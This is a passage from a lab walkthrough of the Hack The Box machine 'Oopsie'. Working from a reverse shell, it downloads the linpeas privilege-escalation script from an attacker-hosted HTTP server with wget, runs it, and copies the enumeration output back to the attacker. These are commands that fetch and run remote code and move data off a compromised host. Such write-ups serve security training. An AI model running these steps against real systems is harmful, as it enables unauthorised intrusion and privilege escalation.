Using the reverse shell, download linpeas and run it.
```
### Attacker
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


### Target
www-data@oopsie:/tmp$ wget http://10.10.16.23:8000/linpeas.sh
wget http://10.10.16.23:8000/linpeas.sh
--2025-08-20 12:13:43--  http://10.10.16.23:8000/linpeas.sh
Connecting to 10.10.16.23:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 954437 (932K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh            0%[                    ]       0  --.-KB/s             linpeas.sh            7%[>                   ]  70.35K   349KB/s             linpeas.sh           19%[==>                 ] 186.29K   435KB/s             linpeas.sh           32%[=====>              ] 300.93K   453KB/s             linpeas.sh           46%[========>           ] 429.90K   479KB/s             linpeas.sh           62%[===========>        ] 586.41K   520KB/s             linpeas.sh           79%[==============>     ] 742.56K   547KB/s             linpeas.sh          100%[===================>] 932.07K   618KB/s    in 1.5s    

2025-08-20 12:13:45 (618 KB/s) - 'linpeas.sh' saved [954437/954437]

### Attacker 
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.161.165 - - [21/Aug/2025 06:13:54] "GET /linpeas.sh HTTP/1.1" 200 -
```

## Run linpeas
```
www-data@oopsie:/tmp$ ./linpeas.sh > linpeas.txt
./linpeas.sh > linpeas.txt
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
```

## Download linpeas.txt to attacker
```
# Target - host the file
www-data@oopsie:/tmp$ python3 -m http.server 8000
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

# Attacker - get the file
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Retired Machines/Oopsie]
└─$ wget http://10.129.161.165:8000/linpeas.txt         
--2025-08-21 06:22:36--  http://10.129.161.165:8000/linpeas.txt
Connecting to 10.129.161.165:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 152807 (149K) [text/plain]
Saving to: ‘linpeas.txt’

linpeas.txt         100%[================>] 149.23K   858KB/s    in 0.2s    

2025-08-21 06:22:36 (858 KB/s) - ‘linpeas.txt’ saved [152807/152807]

```